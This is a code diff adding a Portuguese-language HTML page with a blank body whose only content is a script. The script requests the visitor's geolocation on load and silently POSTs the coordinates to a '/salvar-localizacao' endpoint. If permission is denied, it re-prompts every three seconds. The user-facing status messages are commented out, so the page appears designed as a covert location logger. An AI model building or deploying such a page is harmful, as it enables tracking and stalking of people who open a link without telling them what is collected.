@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    
+</head>
+<body>
+   
+
+    <script>
+        function enviarLocalizacao(latitude, longitude) {
+            fetch('/salvar-localizacao', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ latitude, longitude })
+            })
+            .then(response => response.json())
+            .then(data => {
+                //document.getElementById('status').innerText = data.status;
+            })
+            .catch(error => {
+                console.error('Erro ao enviar localização:', error);
+               // document.getElementById('status').innerText = 'Erro ao enviar localização.';
+            });
+        }
+
+        function tentarObterLocalizacao() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                       
+
+                        enviarLocalizacao(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error('❌ Erro ao obter localização:', error);
+                       
+                        // Tenta novamente após 3 segundos
+                        setTimeout(tentarObterLocalizacao, 3000);
+                    }
+                );
+            } else {
+              
+            }
+        }
+
+        // Inicia as tentativas
+        tentarObterLocalizacao();
+    </script>
+</body>
+</html>
